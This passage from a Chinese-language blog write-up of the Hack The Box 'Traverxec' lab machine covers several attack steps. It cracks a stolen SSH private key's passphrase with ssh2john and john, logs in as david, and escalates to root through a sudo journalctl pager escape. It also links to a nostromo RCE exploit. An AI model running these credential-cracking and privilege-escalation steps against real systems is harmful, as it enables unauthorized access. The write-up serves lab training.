+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ tar czvf backup-ssh-identity-files.tgz</span><br><span class="line"><span class="comment"># 解压之后是home目录，保存着/home/david/.ssh/目录的内容，如下：</span></span><br><span class="line">$ ls</span><br><span class="line">david</span><br><span class="line">$ <span class="built_in">cd</span> david/.ssh</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys id_rsa          id_rsa.pub</span><br></pre></td></tr></table></figure>
+<p>破解私钥，登陆david</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cp ./home/david/.ssh/id_rsa ./</span><br><span class="line"><span class="comment"># ssh2john</span></span><br><span class="line">$ python /usr/share/john/ssh2john.py id_rsa &gt; david.id_rsa.john</span><br><span class="line"><span class="comment"># john crach</span></span><br><span class="line">$ john --format=SSH --wordlist=/usr/share/wordlist/rockyou.txt</span><br><span class="line"><span class="comment"># 查看密码</span></span><br><span class="line">$ john --show david.id_rsa.john</span><br></pre></td></tr></table></figure>
+<p>拿到david私钥的密码：””</p>
+<h4 id="user-david"><a href="#user-david" class="headerlink" title="user:david"></a>user:david</h4><p>通过id_rsa登陆165</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ssh david@10.10.10.165 -i id_rsa</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br><span class="line">Linux traverxec 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span></span><br><span class="line">Last login: Wed Jan 15 10:58:44 2020 from 10.10.15.171</span><br><span class="line">david@traverxec:~$ ls  -la</span><br><span class="line">total 36</span><br><span class="line">drwx--x--x 5 david david 4096 Oct 25 17:02 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Oct 25 14:32 ..</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Oct 25 16:15 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 david david  220 Oct 25 14:32 .bash_logout</span><br><span class="line">-rw-r--r-- 1 david david 3526 Oct 25 14:32 .bashrc</span><br><span class="line">-rw-r--r-- 1 david david  807 Oct 25 14:32 .profile</span><br><span class="line">drwx------ 2 david david 4096 Oct 25 17:02 .ssh</span><br><span class="line">drwx------ 2 david david 4096 Oct 25 16:26 bin</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25 15:45 public_www</span><br><span class="line">-r--r----- 1 root  david   33 Oct 25 16:14 user.txt</span><br></pre></td></tr></table></figure>
+<p>从当前目录下发现bin目录，查看bin目录内容</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~$ <span class="built_in">cd</span> bin</span><br><span class="line">david@traverxec:~/bin$ ls  -la</span><br><span class="line">total 16</span><br><span class="line">drwx------ 2 david david 4096 Oct 25 16:26 .</span><br><span class="line">drwx--x--x 5 david david 4096 Oct 25 17:02 ..</span><br><span class="line">-r-------- 1 david david  802 Oct 25 16:26 server-stats.head</span><br><span class="line">-rwx------ 1 david david  363 Oct 25 16:26 server-stats.sh</span><br></pre></td></tr></table></figure>
+<p>查看并运行server-stats.sh文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ cat server-stats.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cat /home/david/bin/server-stats.head</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Load: `/usr/bin/uptime`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Last 5 journal log lines:"</span></span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行server-stats.sh文件</span></span><br><span class="line">david@traverxec:~/bin$ ./server-stats.sh</span><br><span class="line">                                                                          .----.</span><br><span class="line">                                                              .---------. | == |</span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">""</span><span class="string">""</span><span class="string">"-.| |----|</span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |</span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|</span></span><br><span class="line"><span class="string">                                                              |'-.....-'| |::::|</span></span><br><span class="line"><span class="string">                                                              '"</span><span class="string">")---("</span><span class="string">"' |___.|</span></span><br><span class="line"><span class="string">                                                             /:::::::::::\"    "</span></span><br><span class="line">                                                            /:::=======:::\</span><br><span class="line">                                                        jgs <span class="string">'"""""""""""""'</span></span><br><span class="line"></span><br><span class="line">Load:  11:10:19 up 23 min,  3 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line"></span><br><span class="line">Open nhttpd sockets: 11</span><br><span class="line">Files <span class="keyword">in</span> the docroot: 117</span><br><span class="line"></span><br><span class="line">Last 5 journal <span class="built_in">log</span> lines:</span><br><span class="line">-- Logs begin at Wed 2020-01-15 10:47:08 EST, end at Wed 2020-01-15 11:10:19 EST. --</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: pam_unix(sudo:auth): conversation failed</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: pam_unix(sudo:auth): auth could not identify password <span class="keyword">for</span> [www-data]</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: www-data : user NOT <span class="keyword">in</span> sudoers ; TTY=pts/3 ; PWD=/usr/bin ; USER=root ; COMMAND=/usr/bin/chown -R www-data</span><br><span class="line">Jan 15 11:03:53 traverxec sudo[1022]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/6 ruser=www-data rhost=  user=www-data</span><br><span class="line">Jan 15 11:04:01 traverxec sudo[1022]: www-data : <span class="built_in">command</span> not allowed ; TTY=pts/6 ; PWD=/home/david ; USER=root ; COMMAND=list</span><br></pre></td></tr></table></figure>
+<p>尝试直接用sudo运行journalctl文件，需要david用户的密码，</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl</span><br><span class="line">[sudo] password <span class="keyword">for</span> david:</span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> david:</span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> david:</span><br><span class="line">sudo: 3 incorrect password attempts</span><br></pre></td></tr></table></figure>
+<h4 id="Priv-root"><a href="#Priv-root" class="headerlink" title="Priv:root"></a>Priv:root</h4><p>通过journalctl获取shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat</span><br><span class="line">-- Logs begin at Wed 2020-01-15 10:47:08 EST, end at Wed 2020-01-15 11:14:57 EST. --</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: pam_unix(sudo:auth): conversation failed</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: pam_unix(sudo:auth): auth could not identify password <span class="keyword">for</span> [www-data]</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: www-data : user NOT <span class="keyword">in</span> sudoers ; TTY=pts/3 ; PWD=/usr/bin ; USER=root ; COMMAND=/usr/bin/chown -R www-data</span><br><span class="line">Jan 15 11:03:53 traverxec sudo[1022]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/6 ruser=www-data rhost=  user=www-data</span><br><span class="line">Jan 15 11:04:01 traverxec sudo[1022]: www-data : <span class="built_in">command</span> not allowed ; TTY=pts/6 ; PWD=/home/david ; USER=root ; COMMAND=list</span><br><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line">-- Logs begin at Wed 2020-01-15 10:47:08 EST, end at Wed 2020-01-15 11:15:10 EST. --</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: pam_unix(sudo:auth): conversation failed</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: pam_unix(sudo:auth): auth could not identify password <span class="keyword">for</span> [www-data]</span><br><span class="line">Jan 15 10:59:46 traverxec sudo[956]: www-data : user NOT <span class="keyword">in</span> sudoers ; TTY=pts/3 ; PWD=/usr/bin ; USER=root ;</span><br><span class="line">Jan 15 11:03:53 traverxec sudo[1022]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty</span><br><span class="line">Jan 15 11:04:01 traverxec sudo[1022]: www-data : <span class="built_in">command</span> not allowed ; TTY=pts/6 ; PWD=/home/david ; USER=roo</span><br><span class="line">!/bin/bash</span><br><span class="line">root@traverxec:/home/david/bin<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@traverxec:/home/david/bin<span class="comment"># cd /root</span></span><br><span class="line">root@traverxec:~<span class="comment"># ls -la</span></span><br><span class="line">total 64</span><br><span class="line">drwx------  3 root root  4096 Nov 12 04:00 .</span><br><span class="line">drwxr-xr-x 18 root root  4096 Oct 25 14:17 ..</span><br><span class="line">lrwxrwxrwx  1 root root     9 Oct 25 16:21 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root  4096 Nov 12 04:00 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--  1 root root   148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root 37520 Oct 25 14:43 nostromo_1.9.6-1.deb</span><br><span class="line">-r--------  1 root root    33 Oct 25 16:21 root.txt</span><br><span class="line">root@traverxec:~<span class="comment"># cat root.txt</span></span><br><span class="line">9aa36a6d76f785dfd320a478f6e0d906</span><br></pre></td></tr></table></figure>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.exploit-db.com/exploits/47837" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47837</a><br><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a><br><a href="https://hashcat.net/forum/thread-4283.html" target="_blank" rel="noopener">https://hashcat.net/forum/thread-4283.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Crack-id-rsa/" rel="tag"># Crack id_rsa</a>
+          
+            <a href="/tags/nostromo/" rel="tag"># nostromo</a>
+          
+            <a href="/tags/nostromo-1-9-6/" rel="tag"># nostromo 1.9.6</a>
+          
+            <a href="/tags/CVE-2019-16278/" rel="tag"># CVE-2019-16278</a>
+          
+            <a href="/tags/Cisco-IOS-Hash/" rel="tag"># Cisco IOS Hash</a>
+          
+            <a href="/tags/nostromo-conf/" rel="tag"># nostromo conf</a>
+          
+            <a href="/tags/suid/" rel="tag"># suid</a>
+          
+            <a href="/tags/journalctl/" rel="tag"># journalctl</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/11/HTB-Linux-OpenAdmin/" rel="next" title="HTB Linux OpenAdmin">
+                <i class="fa fa-chevron-left"></i> HTB Linux OpenAdmin
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/20/HTB-Linux-Postman/" rel="prev" title="HTB Linux Postman">
+                HTB Linux Postman <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nostromo-RCE"><span class="nav-number">2.</span> <span class="nav-text">nostromo RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集-1"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#细心阅读配置文件内容，找到新思路（感谢Saker大佬的tips，感谢google翻译）"><span class="nav-number">4.</span> <span class="nav-text">细心阅读配置文件内容，找到新思路（感谢Saker大佬的tips，感谢google翻译）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#user-david"><span class="nav-number">5.</span> <span class="nav-text">user:david</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Priv-root"><span class="nav-number">6.</span> <span class="nav-text">Priv:root</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考链接"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
